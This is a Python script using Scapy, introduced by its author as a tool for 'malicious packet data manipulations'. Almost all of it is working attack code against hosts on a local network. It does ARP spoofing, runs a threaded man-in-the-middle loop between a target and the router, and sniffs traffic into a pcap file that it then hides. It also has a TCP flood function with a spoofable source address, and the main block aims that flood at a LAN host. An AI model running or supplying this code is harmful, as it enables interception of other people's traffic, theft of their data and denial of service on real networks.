#I want to create a script that allows me to perform a range of malicious packet data manipulations

#Useful libraries that I would be working with 
from scapy.all import *
import subprocess
import sys
import time
import os
import socket
import struct
import textwrap
from threading import Thread
import datetime
import urllib.request
import netifaces

#Declaring the packet bender class
class PacketBender:
    def __init__(self, target: str):
        self.publicIP = urllib.request.urlopen('https://api.ipify.org/').read().decode('utf8')
        self.router = netifaces.gateways()["default"][netifaces.AF_INET][0]
        self.target = target #This is the name of the target
        self.datetime = datetime.datetime.now().strftime("%H:%M:%S %p. %d %B, %Y")

    #This function does the arp spoofing
    def spoofer(self, targetIP: str, spoofIP: str):
        targetMAC = getmacbyip(targetIP)
        packet = ARP(op = 2, pdst = targetIP, hwdst = targetMAC, psrc = spoofIP)
        send(packet, verbose = True)

    #This function restores back the arp to its default
    def restore(self, targetIP: str, spoofIP: str):
        targetMAC = getmacbyip(targetIP)
        spoofMAC = getmacbyip(spoofIP)
        packet = ARP(op = 2, pdst = targetIP, hwdst = targetMAC, psrc = spoofIP, hwsrc = spoofMAC)
        send(packet, count = 4, verbose = True)

    #This function would attempt to perform a mitm attack
    #For some reason yet known to me, the mitm attack affects the internet connection of the target machine
    def mitm(self, targetIP: str, count_: int):
        packets = 0
        count = 0
        try:
            print(f"Commencing MITM attack on {targetIP}")
            while True:
                self.spoofer(targetIP, self.router)
                self.spoofer(self.router, targetIP)
                #print(f"Sent {packets} packets")
                sys.stdout.flush()
                packets += 2
                time.sleep(2)
                count += 2
                print(f"Count: {count}")
                if count >= count_:
                    print("Count sequence has been exhausted, ending the mitm and restoring back the arp to default")
                    raise KeyboardInterrupt
        except KeyboardInterrupt:
            print("MITM has been interrupted, restoring the arp back to default")
            self.restore(targetIP, self.router)
            self.restore(self.router, targetIP)
        except Exception as e:
            print(f"An error occurred in mitm due to [{e}], restoring the arp back to default")
            self.restore(targetIP, self.router)
            self.restore(self.router, targetIP)

    #This function would attempt to sniff the network packets
    def sniffer(self, count_: int, save: bool = True):
        #Fine tuning the packet data infos that I'm interested in
        ether = "{Ether: Src = %Ether.src% -> Dst = %Ether.dst%, Type = %Ether.type%}"
        ip = "{IP: Src = %IP.src% -> Dst = %IP.dst%, Protocol = %IP.proto%}"
        arp = "{ARP: Src = %ARP.psrc% -> Dst = %ARP.pdst%}"
        tcp = "{TCP: Src = %TCP.sport% -> Dst = %TCP.dport%}"
        udp = "{UDP: Src = %UDP.sport% -> Dst = %UDP.dport%}"
        data = "{Raw:%Raw.load%}"
        report_ = sniff(prn=lambda x:x.sprintf(f"Packet Summary for {ether} \nARP: {arp} \nIP: {ip} \nTCP: {tcp} \nUDP: {udp} \nData: {data}\n"), count=count_)
        if save:
            sniffer_file = f"{self.target}_network_sniffer.pcap"
            wrpcap(sniffer_file, report_, append = True)
            os.system(f"attrib +h {sniffer_file}") #This hides the file after its done so that you can access it later

    #This function threads both the mitm and sniffer function
    def sniffMITM(self, targetIP: str, count_: int = 25):
        t1 = Thread(target = self.mitm, args = (targetIP, count_, ))
        t1.start()
        time.sleep(2)
        t2 = Thread(target = self.sniffer, args = (count_ * 2, )) #Multiplied count by 2 to elongate the sniffing period so that it matches count for the mitm attack
        t2.start()

        for t in [t1, t2]:
            t.join()

    #This function attempts to perform a dos attack 
    def dos_attacker(self, targetIP: str, sourceIP: str = None, port: int = 80, count_: int = 1000):
        if sourceIP is None:
            sourceIP = self.publicIP
        print(f"Initiating a DOS attack on {targetIP} from {sourceIP}")
        send(IP(src=sourceIP, dst=targetIP)/TCP(sport=port, dport=port), count=count_)

if __name__ == "__main__":
    print('Packet manipulator \n')

    target = "Konoha"
    a = PacketBender(target)
    target_IP = "192.168.127.115"
    count = 25
    #c = a.sniffMITM(target_IP, count)
    #c = a.sniffer(count)
    c = a.dos_attacker(target_IP)
    

    print("\nExecuted successfully")
